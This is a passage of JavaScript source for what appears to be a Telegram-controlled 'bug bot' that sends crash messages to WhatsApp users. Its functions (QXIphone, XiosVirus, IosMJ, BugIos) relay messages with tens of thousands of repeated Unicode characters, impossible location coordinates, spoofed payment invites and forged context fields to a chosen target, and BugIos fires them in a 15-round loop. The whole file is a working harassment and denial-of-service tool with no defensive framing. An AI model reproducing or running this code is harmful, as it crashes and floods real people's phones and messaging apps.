        serviceType: "FBPAY",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function QXIphone(sock, target) {
  let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
  await sock.relayMessage(
    target,
    {
      locationMessage: {
        degreesLatitude: 999.03499999999999,
        degreesLongitude: -999.03499999999999,
        name: CrashQAiphone,
        url: "https://t.me/sockwzzaja",
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}
async function QPayIos(sock, target) {
  await sock.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "PAYPAL",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function QPayStriep(sock, target) {
  await sock.relayMessage(
    target,
    {
      paymentInviteMessage: {
        serviceType: "STRIPE",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    }
  );
}

async function QDIphone(target) {
  sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "ꦾ".repeat(55000),
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 5184000000,
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}

//

async function IosMJ(target, Ptcp = false) {
  await sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
        contextInfo: {
          stanzaId: "1234567890ABCDEF",
          participant: "0@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: true,
              callOutcome: "1",
              durationSecs: "0",
              callType: "REGULAR",
              participants: [
                {
                  jid: "0@s.whatsapp.net",
                  callOutcome: "1",
                },
              ],
            },
          },
          remoteJid: target,
          conversionSource: "source_example",
          conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
          conversionDelaySeconds: 10,
          forwardingScore: 99999999,
          isForwarded: true,
          quotedAd: {
            advertiserName: "Example Advertiser",
            mediaType: "IMAGE",
            jpegThumbnail:
              "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            caption: "This is an ad caption",
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890",
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "Ueheheheeh",
            body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewTtpe: "VIDEO",
            thumbnail:
              "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "https://t.me/sockwzzaja",
            mediaUrl: "https://t.me/sockwzzaja",
            containsAutoReply: true,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example",
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "https://t.me/sockwzzaja",
          },
          groupSubject: "Example Group Subject",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: "trust_banner_example",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: "utm_source_example",
            utmCampaign: "utm_campaign_example",
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " target ",
            contentType: "UPDATE",
            accessibilityText: " target ",
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net",
          },
          smbcayCampaignId: "smb_sock_campaign_id_example",
          smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true,
          },
        },
      },
    },
    Ptcp
      ? {
          participant: {
            jid: target,
          },
        }
      : {}
  );
}
async function XiosVirus(sock, target) {
  sock.relayMessage(
    target,
    {
      extendedTextMessage: {
        text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(90000),
        contextInfo: {
          fromMe: false,
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(90000),
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING",
          },
        },
        inviteLinkGroupTypeV2: "DEFAULT",
      },
    },
    {
      participant: {
        jid: target,
      },
    },
    {
      messageId: null,
    }
  );
}

async function BugIos(sock, target) {
  for (let i = 0; i < 15; i++) {
    await IosMJ(sock, target);
    await XiosVirus(sock, target);
    await QDIphone(sock, target);
    await QPayIos(sock, target);
    await QPayStriep(sock, target);
    await FBiphone(sock, target);
    await VenCrash(sock, target);
    await AppXCrash(sock, target);
    await SmCrash(sock, target);
    await SqCrash(sock, target);
    await IosMJ(target, target);
    await XiosVirus(sock, target);
  }
  console.log(chalk.red.bold(`Wanna With Yours :)!`));
}
// --- Jalankan Bot ---
bot.launch();
console.log("Telegram bot is running...");
